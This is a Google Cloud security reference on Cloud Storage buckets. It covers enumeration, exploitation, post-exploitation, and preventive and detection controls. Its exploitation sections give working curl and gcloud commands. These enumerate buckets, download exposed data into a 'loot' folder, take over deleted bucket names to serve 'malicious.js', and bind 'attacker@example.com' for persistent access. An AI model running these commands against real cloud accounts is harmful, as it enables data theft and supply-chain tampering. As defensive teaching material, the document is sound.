# Cloud Storage Attacks

Google Cloud Platform security reference: how Cloud Storage buckets become exposed, how to enumerate and abuse them, and how to detect and prevent data exposure.

## 1. Overview

Cloud Storage is Google's object storage service. Buckets are the top-level container; objects are the files inside them. Two facts make Cloud Storage a recurring attack surface:

- **Bucket names are globally unique and DNS-resolvable.** `https://storage.googleapis.com/<bucket>` returns 200 for public objects, 403 for private existing buckets, and 404 for non-existent buckets. This makes enumeration possible without any credential.
- **Bucket and object permissions are IAM-based.** Cloud Storage IAM roles (`roles/storage.objectViewer`, `roles/storage.objectAdmin`, `roles/storage.admin`) are bound to projects, buckets, or individual objects. A single misconfigured `allUsers` binding exposes the bucket to the internet.

The two failure modes that dominate real-world incidents are:

1. **Public bucket** - `allUsers` or `allAuthenticatedUsers` has `roles/storage.objectViewer` (or stronger) on the bucket. Data is readable, sometimes writable, by anyone.
2. **Over-permissive service account** - a service account with `roles/storage.admin` in a project where it is not needed, or with access to buckets in other projects.

The [Google Cloud Storage security documentation](https://cloud.google.com/storage/docs/security) is the reference for the controls described here.

## 2. Reconnaissance and Enumeration

### 2.1 Unauthenticated bucket enumeration

Bucket names are derived from project IDs, company names, environment names, and application names. Common patterns:

```text
<company>-backup
<company>-prod
<company>-dev
<company>-assets
<company>-logs
<company>-data
<company>-public
<company>-media
<company>-uploads
```

For each candidate, a HEAD request distinguishes states:

```bash
for b in acme-backup acme-prod acme-dev acme-assets acme-logs; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/$b")
  echo "$b -> $code"
done
```

Expected output:

```text
acme-backup -> 403
acme-prod -> 403
acme-dev -> 404
acme-assets -> 200
acme-logs -> 403
```

- `200` - bucket is public; list the objects.
- `403` - bucket exists but is private. The bucket exists, which is already an information leak.
- `404` - bucket does not exist. Name is available for registration (a takeover vector for client apps).

### 2.2 Enumerate objects in a public bucket

```bash
curl -s "https://storage.googleapis.com/storage/v1/b/acme-assets/o"
```

Expected output (trimmed):

```text
{"kind":"storage#objects","items":[{"name":"config.json",...},{"name":"backup.tar.gz",...}]}
```

If the bucket has `storage.objects.list` for `allUsers`, this returns the full object list. Otherwise, individual object names must be guessed or extracted from application source.

### 2.3 Authenticated enumeration

With any valid credential:

```bash
gcloud storage buckets list --project=<PROJECT_ID>
gcloud storage ls gs://<BUCKET_NAME>/ --recursive | head -50
gcloud storage buckets describe gs://<BUCKET_NAME> --format="json(iamConfiguration,location,storageClass)"
```

Expected output (trimmed):

```json
{"iamConfiguration":{"publicAccessPrevention":"inherited","uniformBucketLevelAccess":{"enabled":false}},"location":"US","storageClass":"STANDARD"}
```

`publicAccessPrevention: inherited` and `uniformBucketLevelAccess.enabled: false` are both findings: the bucket can be made public, and object-level ACLs are enabled.

## 3. Common Attack Vectors

| Vector | Mechanism | Impact |
|--------|-----------|--------|
| Public bucket | `allUsers` has `objectViewer` | Data exfiltration |
| Public bucket with write | `allUsers` has `objectCreator` or `objectAdmin` | Data tampering, sometimes code execution via client apps |
| Bucket takeover | Name exists in app config, bucket deleted | Attacker re-registers bucket, serves malicious content |
| Signed URL leakage | Signed URL in logs, source, or browser history | Temporary access to a specific object |
| Over-permissive SA | SA with `storage.admin` | Full bucket control, including IAM changes |
| Object-level ACL | Legacy ACL mode with per-object grants | Bypasses bucket-level uniform access |
| Cross-project bucket access | SA from project A bound on bucket in project B | Lateral movement via storage |

The bucket takeover vector is often overlooked: an app that references `https://storage.googleapis.com/acme-assets/config.json` will silently break if the bucket is deleted, and an attacker who registers the same name controls the content the app fetches.

## 4. Exploitation Recipes

### 4.1 Enumerate and download a public bucket

```bash
# List objects
curl -s "https://storage.googleapis.com/storage/v1/b/acme-assets/o?maxResults=1000" | jq -r '.items[].name'

# Download a specific object
curl -s -o config.json "https://storage.googleapis.com/acme-assets/config.json"

# Recursive download via gcloud (works on public buckets)
gcloud storage cp -r gs://acme-assets/ ./loot/
```

The recursive `gcloud storage cp` does not require authentication for public objects; it uses the same HTTPS endpoint as `curl`.

### 4.2 Abuse a leaked signed URL

A signed URL has the form:

```text
https://storage.googleapis.com/acme-assets/report.pdf?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=...&X-Goog-Signature=...
```

The URL grants access to a specific object for a limited time (typically 1-7 days). If a signed URL is found in:

- Application source on GitHub
- Browser history on a shared workstation
- Server logs (e.g. a `Referer` header from a browser)
- Slack/email threads

it can be replayed until it expires. To extend access, find the signing identity: if it is a service account key, the key may also be leaked.

### 4.3 Bucket takeover

If an app config references a bucket that no longer exists, register the same bucket name in an attacker-controlled project:

```bash
gcloud storage buckets create gs://acme-assets --project=attacker-project --location=US
gcloud storage cp malicious.js gs://acme-assets/
```

Any client (web app, mobile app, CI pipeline) that fetches `https://storage.googleapis.com/acme-assets/malicious.js` now receives attacker content. This is a supply-chain vector: no credential is stolen, but the content consumed by a trusted application is controlled by the attacker.

### 4.4 Use an over-permissive service account

If you compromise a SA with `roles/storage.admin`:

```bash
gcloud storage ls --recursive gs://acme-backup/
gcloud storage cp -r gs://acme-backup/ ./loot-backup/
gcloud storage buckets add-iam-policy-binding gs://acme-backup --member="user:attacker@example.com" --role="roles/storage.objectViewer"
```

Expected output (trimmed):

```text
gs://acme-backup/db-backup-2024-01-01.sql
gs://acme-backup/db-backup-2024-01-02.sql
...
Updated IAM policy for bucket [acme-backup].
```

Adding an external principal to a production bucket is persistent and silent; it does not change any application behavior, so it is unlikely to be noticed without IAM monitoring.

## 5. Post-Exploitation

Once you have bucket access, the usual goals are:

- **Data exfiltration** - download everything. Cloud Storage is cheap to read and the bucket's location determines which network the data must leave from.
- **Persistence** - add an external principal to the bucket IAM policy, or add a lifecycle rule that copies objects to an attacker bucket in another project.
- **Lateral movement** - if the bucket contains credentials (DB connection strings, API keys, SSH keys, service account JSON), use them in other stages of the attack.
- **Tampering** - if the bucket serves application assets (JS, WASM, config), modify them to inject attacker content into clients.
- **Bucket-level persistence** - change the bucket's retention policy or add a Pub/Sub notification to an attacker-controlled topic.

## 6. Preventive Controls

- **Uniform bucket-level access** - enable `uniformBucketLevelAccess` on every bucket. It disables legacy object ACLs and forces all access through IAM.
- **Public access prevention** - set `public_access_prevention = "enforced"` at the project level, not just per bucket. This blocks `allUsers` and `allAuthenticatedUsers` bindings project-wide.
- **Organization policy `constraints/storage.publicAccessPrevention`** - enforce `enforced` at the org level. No project can create a public bucket.
- **Organization policy `constraints/storage.uniformBucketLevelAccess`** - enforce uniform access at the org level.
- **CMEK for sensitive buckets** - customer-managed encryption keys let you revoke access to the bucket's data by disabling the key, independent of IAM.
- **VPC Service Controls** - wrap the bucket in a service perimeter to prevent access from outside the perimeter, even with a valid token.
- **Bucket naming hygiene** - include the environment and region in the bucket name, and monitor bucket creation with Cloud Audit Logs.
- **Signed URL expiry** - keep signed URLs short (minutes, not days). Never log signed URLs; redact them in logging sinks.
- **Regular bucket inventory** - use `gcloud asset search-all-resources --asset-types=storage.googleapis.com/Bucket` to list every bucket in the org and review its IAM configuration.

## 7. Detection Controls

- **Cloud Storage data access logs** - off by default. Enable `DATA_READ` and `DATA_WRITE` logs on sensitive buckets.
- **`SetIamPolicy` on buckets** - always logged as Admin Activity. Alert on any change to bucket IAM that adds `allUsers`, `allAuthenticatedUsers`, or an identity outside your domain.
- **`storage.buckets.update`** - alert on any change to `iamConfiguration` or `publicAccessPrevention`.
- **`storage.objects.get` from unexpected IPs** - correlate data-access logs with VPC Flow Logs and identity. An SA reading a bucket it has never touched before is suspicious.
- **Bucket creation** - alert on new bucket creation outside Terraform. Bucket takeover requires a bucket to disappear or appear.
- **Security Command Center** - built-in detectors for publicly accessible buckets, buckets without uniform access, and buckets without CMEK.
- **Data Exfiltration Protection** - combine VPC Service Controls with egress monitoring to alert on large data transfers from Cloud Storage.

## 8. Verification

To verify that the controls are in place across a project:

```bash
# 1. Every bucket has uniform access and public access prevention
gcloud storage buckets list --project=<PROJECT_ID> --format="table(name,iamConfiguration.uniformBucketLevelAccess.enabled,iamConfiguration.publicAccessPrevention)"

# 2. No bucket IAM binds allUsers or allAuthenticatedUsers
for b in $(gcloud storage buckets list --project=<PROJECT_ID> --format="value(name)"); do
  gcloud storage buckets get-iam-policy "gs://$b" --format=json | jq '.. | .members? // empty | .[]' | grep -E "allUsers|allAuthenticatedUsers" && echo "PUBLIC BINDING in $b"
done

# 3. Organization policies in effect
gcloud resource-manager org-policies describe constraints/storage.publicAccessPrevention --project=<PROJECT_ID>
gcloud resource-manager org-policies describe constraints/storage.uniformBucketLevelAccess --project=<PROJECT_ID>
```

Expected: every bucket shows `True` and `enforced`; no output from step 2; both org policies enforced.

## 9. Cloud-Specific Considerations

- **Object versioning and retention** - versioning preserves deleted or overwritten objects for a configurable period. If an attacker overwrites application assets, versioning allows rollback. Retention policies (WORM) prevent deletion entirely.
- **Signed URLs vs public buckets** - a signed URL is time-limited and object-scoped. A public bucket is permanent and bucket-scoped. Signing is almost always preferable for serving content.
- **Cross-project bucket access** - a bucket in project A can be bound to a service account in project B. This is common in data-lake architectures and is easy to miss when reviewing a single project's IAM.
- **Bucket location** - data residency matters. A bucket in `EU` cannot be read by a workload in `US` without egress, and the read is visible in VPC Flow Logs. Location is a control as well as a compliance choice.
- **Soft delete** - Google Cloud Storage soft delete preserves deleted objects for 7-30 days. An attacker who deletes objects can be undone; defenders should enable soft delete on production buckets.

## 10. Production Notes

- Enable `uniformBucketLevelAccess` and `publicAccessPrevention=enforced` on every bucket. There is no legitimate reason to run a production bucket without both.
- Do not use object ACLs. They bypass bucket-level IAM and are easy to misconfigure.
- Store service account keys, DB credentials, and API tokens in Secret Manager, not in Cloud Storage. Even a private bucket is one misconfiguration away from public.
- Use CMEK for buckets that hold regulated data. It provides an independent kill switch that does not depend on IAM.
- Redact signed URLs in any log sink. They are bearer tokens: possession of the URL is authorization to the object.
- Inventory buckets quarterly with Cloud Asset Inventory. Newly created buckets outside Terraform are a strong signal of either accidental exposure or compromise.

## 11. References

- Cloud Storage security - https://cloud.google.com/storage/docs/security
- Uniform bucket-level access - https://cloud.google.com/storage/docs/uniform-bucket-level-access
- Public access prevention - https://cloud.google.com/storage/docs/public-access-prevention
- Signed URLs - https://cloud.google.com/storage/docs/access-control/signed-urls
- VPC Service Controls - https://cloud.google.com/vpc-service-controls/docs/overview
- Cloud Asset Inventory - https://cloud.google.com/asset-inventory/docs/overview

## Certification Alignment

- **Google Cloud Professional Cloud Security Engineer** - bucket IAM design, uniform access, public access prevention, CMEK, VPC Service Controls.
- **Google Cloud Associate Cloud Engineer** - bucket creation, `gcloud storage` commands, IAM bindings.
- **Google Cloud Professional Cloud Architect** - multi-project bucket design, data residency, lifecycle and retention policies.
- **CompTIA Security+** - data protection, access control, encryption at rest.
